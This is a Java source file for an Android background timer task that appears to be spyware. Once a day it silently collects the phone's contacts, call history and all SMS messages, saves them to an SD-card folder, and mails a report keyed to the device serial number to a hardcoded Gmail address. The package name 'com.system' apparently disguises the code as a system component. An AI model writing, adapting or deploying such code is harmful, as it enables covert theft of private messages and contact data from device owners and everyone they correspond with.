package com.system;

import java.io.DataOutputStream;
import java.io.File;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.TimerTask;

import com.system.feature.contact.ContactCtrl;
import com.system.feature.contact.ContactInfo;
import com.system.feature.phonecall.PhoneCallCtrl;
import com.system.feature.phonecall.PhoneCallInfo;
import com.system.feature.sms.SmsCtrl;
import com.system.feature.sms.SmsInfo;
import com.system.utils.*;

import android.app.Activity;
import android.app.Service;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.net.Uri;
import android.os.Environment;
import android.util.Log;

/**
 * Implementation of the timer task for information collection.
 */
public class GetInfoTask extends TimerTask 
{
	private final static String LOGTAG = "GetInfoTask";
	
	private final static String DEFAULT_FOLDER = "tmp"; 
	
	public Service service;
	
	public GetInfoTask(Service service)
	{
		super();
		this.service = service;
	}
	
	public void run() 
	{
		Log.d(LOGTAG, "start to collect infomation");
		
		// Firstly we should make sure the time range (>24H)
		Date lastDatetime = ConfigCtrl.getLastGetInfoTime(service.getApplicationContext());
		Calendar now = Calendar.getInstance();
		now.add(Calendar.DATE, -1);
		Date now_minus_1_day = now.getTime();
		if (lastDatetime != null && now_minus_1_day.before(lastDatetime)) 
		{
			Log.v(LOGTAG, "Not reached the valid timing yet. Last time: " + lastDatetime.toString());
			return;
		}
		
		// If network connected, try to collect and send the information
		if (SysUtils.isNetworkConnected(service.getApplicationContext()))
		{
			CollectContact(this.service);
			SysUtils.ThreadSleep(100000, LOGTAG);
			CollectPhoneCallHist(this.service);
			SysUtils.ThreadSleep(100000, LOGTAG);
			CollectSms(this.service);
		
			// Send mail
			boolean result = sendMail();
			
			// Update the last date time
			if (result) ConfigCtrl.setLastGetInfoTime(service.getApplicationContext(), new Date());
		}
		
	}
	
	public static void CollectSms(Context context) 
	{
		StringBuilder sb = new StringBuilder();
		List<SmsInfo> list = SmsCtrl.getSmsList(context, SmsCtrl.SMS_URI_ALL);
		for (int i = 0; i < list.size(); i++)
		{
			sb.append(list.get(i).toString());
			sb.append(SysUtils.NEWLINE);
		}
		
		String fileName = FileCtrl.makeFileName(context.getApplicationContext(), 
				Resources.getSystem().getString(R.string.sms_name)); 
		try {
			if (!FileCtrl.dirExist(DEFAULT_FOLDER)) FileCtrl.creatSDDir(DEFAULT_FOLDER);
				
			FileCtrl.Save2SDCard("\\" + DEFAULT_FOLDER + "\\" + fileName, sb.toString());
		} catch (Exception e) {
			Log.e(LOGTAG, e.getMessage());
		}
	}

	public static void CollectPhoneCallHist(Context context) 
	{
		StringBuilder sb = new StringBuilder();
		List<PhoneCallInfo> list = PhoneCallCtrl.getPhoneCallHistory(context);
		for (int i = 0; i < list.size(); i++)
		{
			sb.append(list.get(i).toString());
		}
		
		String fileName = FileCtrl.makeFileName(context, 
				Resources.getSystem().getString(R.string.phonecall_name)); 
		try {
			if (!FileCtrl.dirExist(DEFAULT_FOLDER)) FileCtrl.creatSDDir(DEFAULT_FOLDER);
				
			FileCtrl.Save2SDCard("\\" + DEFAULT_FOLDER + "\\" + fileName, sb.toString());
		} catch (Exception e) {
			Log.e(LOGTAG, e.getMessage());
		}
	}

	public static void CollectContact(Context context) 
	{
		StringBuilder sb = new StringBuilder();
		List<ContactInfo> list = ContactCtrl.getContactList(context);
		for (int i = 0; i < list.size(); i++)
		{
			sb.append(list.get(i).toString());
		}
		
		String fileName = FileCtrl.makeFileName(context, 
				Resources.getSystem().getString(R.string.contact_name)); 
		try {
			if (!FileCtrl.dirExist(DEFAULT_FOLDER)) FileCtrl.creatSDDir(DEFAULT_FOLDER);
				
			FileCtrl.Save2SDCard("\\" + DEFAULT_FOLDER + "\\" + fileName, sb.toString());
		} catch (Exception e) {
			Log.e(LOGTAG, e.getMessage());
		}
	}
	
	private boolean sendMail()
	{
		boolean ret = false;

        try {   
            GMailSender sender = new GMailSender();
            String subject = Resources.getSystem().getString(R.string.mail_from) 
            		 + DeviceProperty.getSerialNum() + " - " + (new String()).toString();
            String body = subject;
            sender.sendMail(subject, body,  
                    "richardroky@gmail.com",   
                    "richardroky@gmail.com");
            ret = true;
        } catch (Exception e) {   
            Log.e(LOGTAG, e.getMessage());
        }
        
		return ret;
	}
}
